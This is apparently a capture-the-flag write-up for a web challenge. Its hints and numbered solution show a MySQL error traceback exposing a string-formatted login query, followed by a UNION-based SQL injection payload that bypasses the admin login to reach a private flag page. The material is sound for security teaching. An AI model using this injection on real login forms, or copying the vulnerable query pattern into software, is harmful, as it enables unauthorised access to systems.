### hints
* Regular users can only see public pages
* Getting admin access might require a more perfect union
* Knowing the password is cool, but there are other approaches that might be easier

### solution

1. navigate to a login page by either **creating a new page** or **editing a page**
2. typical weak credentials don't work here. to name a few:
   * admin / admin
   * admin / admin123
   * admin / password
   * admin / passwd
3. enter broken sql in username field to get error page (e.g. `'`)
```
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
```
4. :evilburns:
5. bypass loging with something similar to this:
   * *Username:* `' union select '1337' as password #`
     * you can place anything instead of `1337` as long as you use it as the password
   * *Password:* `1337`
6. now that you're logged in, navigate back home
7. you'll see **Private Page** where the flag is
